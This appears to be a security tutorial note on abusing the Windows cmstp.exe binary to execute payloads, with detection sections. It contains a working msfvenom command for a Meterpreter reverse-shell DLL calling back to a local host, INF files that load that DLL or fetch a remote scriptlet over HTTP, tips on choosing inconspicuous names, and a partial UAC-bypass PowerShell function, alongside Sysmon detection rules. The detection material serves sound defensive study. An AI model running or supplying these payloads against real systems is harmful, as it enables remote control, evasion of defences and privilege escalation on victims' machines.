## CMSTP

it's legitimate executable in windows, it's used to run INF files, but those INFs could contains dlls, or scriptlets (SCT files)



### DLL

Generate Malicious DLL using MSF venom "x64 DLL"

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4000 -f dll > /var/www/html/evil.dll
```

then move the file to Windows host

create INF file (ex:Payload.inf)

```ini
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection
 
[UnRegisterOCXSection]
c:\Users\Noname\Desktop\evil.dll ; you can run the dll from remote server using WebDAV
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="AnyNameyouwant"  ; try to choose non wierd name"
ShortSvcName="AnyNameyouwant"
```

Open the Multi Handler in MSF console

Execute the INF file

```asm
cmstp.exe /s Payload.inf
```

you will get your Meterpreter 



### Detection

- Sysmon
  - Process Create
    -  CMSTP.exe process create with cmd or PowerShell as 
    - CMD.exe process create with CMSTP.exe in the command Line
  - Network Connection
    - From CMSTP.exe
  - Image Loading
    - The Malicious DLL
    - Usually ws2_32.dll for malicious DLLs which requires socket connection
- Process Explorer
  - Check Modules associated with cmstp.exe

```xml
<Sysmon schemaversion="4.00">
<HashAlgorithms>md5,sha256,IMPHASH</HashAlgorithms>
  <EventFiltering>
      		<ProcessCreate default="include">
				<Image condition="contains">cmstp.exe</Image>
			</ProcessCreate>
      		<ImageLoad onmatch="include">
				<Image condition="image">cmstp.exe</Image>
			</ImageLoad>	
      
	</EventFiltering>
</Sysmon>      
```

the above rules is just for demonstration, we should not include certain process in process create, we should include all and exclude just some annoying legitimate processes



### SCT

you have to create INF file as the below

```ini
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection
 
[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://192.168.1.4/Mal.sct ; you can set local path for the sct
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="MalSCT"  ; try to choose non wierd name"
ShortSvcName="MalSCT" ; try to choose non wierd name"
```

```powershell
cmstp.exe /s payload.inf
```



### Detection

- sysmon
  - Process Create
    -  CMSTP.exe process create with cmd or PowerShell as 
    - CMD.exe process create with CMSTP.exe in the command Line
  - Network Connection
    - From CMSTP.exe
  - File Create
    - cmp file on the Disk with the name of the service in the INF
    - lnk file on the Disk with the name of the service in the INF
- Network Manager
  - VPN new connection with the name of the service in the INF
- Folder Created with the name of the service in the INF



### Privilege escalation

CMSTP.exe also could be used for privilege escalation

```powershell
function Bypass-UAC
{
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$Command
    )
    if(-not ([System.Management.Automation.PSTypeName]'CMSTPBypass').Type)
    {
        [Reflection.Assembly]::Load([Convert]::FromBase64String("")) | Out-Null
    }
    [CMSTPBypass]::Execute($Command)
}
```

this script is taken from here [Link](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html), it's very useful post and no need to discuses this escalation further 